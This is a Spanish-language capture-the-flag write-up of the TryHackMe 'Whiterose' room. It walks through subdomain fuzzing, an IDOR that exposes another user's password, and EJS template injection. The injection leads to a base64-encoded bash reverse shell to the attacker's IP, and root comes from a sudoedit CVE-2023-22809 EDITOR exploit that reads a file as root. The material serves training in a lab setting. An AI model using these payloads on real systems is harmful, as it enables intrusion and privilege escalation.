
![Imagen1](attachments/Pasted%20image%2020250203213856.png)
#easy

******

Al unirnos al room de THM nos dan un username y password que será importantes tenerlos en cuenta:

~~~bash
username: Olivia Cortez
password: olivi8
~~~


Realizamos un escaneo con **Nmap** para poder observar los servicios que usan:

~~~bash
sudo nmap -sS --min-rate 5000 --open -vv -p- -n -Pn whiterose.thm
~~~

![Imagen1](attachments/Pasted%20image%20250203214511.png)

Como podemos ver, tienen el `22` y `80` abiertos. Al ingresar a la pagina web esta nos redirige a otra:

`cyprusbank.thm`

![[Pasted image 20250203214630.png]]

Pasamos a realizar un fuzzing de directorios con gobuster, pero no nos muestra nada interesante.

~~~bash
gobuster dir -u 'http://cyprusbank.thm/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
~~~

Con ffuf realizamos fuzzing de subdominios y vemos que nos dan 2 subdominios:

`www.cyprusbank.thm` `admin.cyprusbank.thm`

~~~bash
ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1
~~~

![[Pasted image 20250203215214.png]]

>[!note]
>`-fw` nos ayuda a descartar falsos positivos en el fuzzing


`www.cyprusbank.thm` no hay nada, sin embargo en `admin.cyprusbank.thm` nos muestra un login donde podemos intentar poner las credenciales del inicio.


![[Pasted image 20250203215438.png]]

Al ingresar con la cuenta de Olivia podemos ver varias cosas interesantes y donde podemos encontrar una de las primeras flag del room.

![[Pasted image 20250203220037.png]]

No podemos ingresar a settings, al parecer no tenemos privilegios.

![[Pasted image 20250203220137.png]]

Pero en mensajes podemos ver algo que me resulto interesante:

![[Pasted image 20250203220242.png]]

En la url podemos ver `c=5` y al cambiar los valores encontramos un IDOR que nos deja observar otros mensajes:

![[Pasted image 20250203220405.png]]

Al explorarlo mas al fondo, damos con una conversación donde el user `Gayle Bev` escribe su password `p~]P@5!6;rs558:q`, y al ingresar con su sesión podemos obtener la primera flag.

*****

Una vez iniciado la sesión de `Gayle Bev` podemos ingresar al apartado de de settings de la web page. En esta podemos actualizar passwords de usuarios:

![[Pasted image 20250203221334.png]]

Al revisar la solicitud con Burpsuite podemos modificar varios puntos para checar la posibilidad de XSS o SSTI. Interceptamos la request y omitimos el passwords y podemos ver que nos contesta con el siguiente error:

![[Pasted image 20250203221618.png]]

En este mensaje podemos observar que están usando `.ejs` (Embedded JavaScript templates), lo que indica que el servidor renderiza plantillas dinámicas. Dado que `.ejs` es vulnerable a **Server-Side Template Injection (SSTI)** si no se maneja correctamente la entrada del usuario, podemos buscar payloads específicos para explotar este tipo de vulnerabilidad en `ejs` y evaluar si es posible ejecutar código en el servidor.

~~~javascript
%%1");process.mainModule.require('child_process').execSync('calc');//
~~~

https://github.com/mde/ejs/issues/720

Modificamos el payload para realizar un curl a nuestro Python server.

~~~js
name=a&password&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.8.27.189:6666');//
~~~

![[Pasted image 20250203222756.png]]

![[Pasted image 20250203222807.png]]

Con esto confirmamos que es un **SSTI**, ahora podemos intentar para explotar una RCE, para esto podemos crear un reverse Shell (https://www.revshells.com/):

![[Pasted image 20250203223016.png]]

Modificamos nuestro payload para que ejecute la reverse:

~~~js
name=a&password&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -i >& /dev/tcp/10.8.27.189/6666 0>&1');//
~~~

Pero al parecer nos esta filtrando la request, entonces aquí podemos encodearlo en base64 para intentar pasarlo.

~~~js
name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMjcuMTg5LzY2NjYgMDA+JjE= | base64 -d | bash"');//  
~~~

![[Pasted image 20250203224626.png]]

Listo, tenemos acceso a la maquina donde podemos encontrar la siguiente flag, pero antes podemos mandar a llamar una Shell interactiva con python:

~~~python
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

![[Pasted image 20250203224739.png]]

******
Ahora para escalar privilegios podemos observar primero que podemos hacer con sudo:

~~~bash
sudo -l
~~~

Y aqui podemos ver algo que podemos explotar:

![[Pasted image 20250203224920.png]]

Podemos checar la versión que usa `sudoedit` con `sudoedit -V` y podemos ver que usa la versión `1.9.12p1`

![[Pasted image 20250203225015.png]]

Al investigar encontramos que existe un CVE para esta versión de `sudoedit`

~~~bash
CVE-2023-22809
~~~

Ahora con lo que encontramos acerca de esta CVE podemos cambiar la variable para que nos muestre la flag de root:

~~~bash
export EDITOR="vi -- /root/root.txt"
~~~

Ya solo queda ejecutar el comando que vimos al principio y aquí tendremos nuestra siguiente y ultima flag:

~~~bash
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
~~~

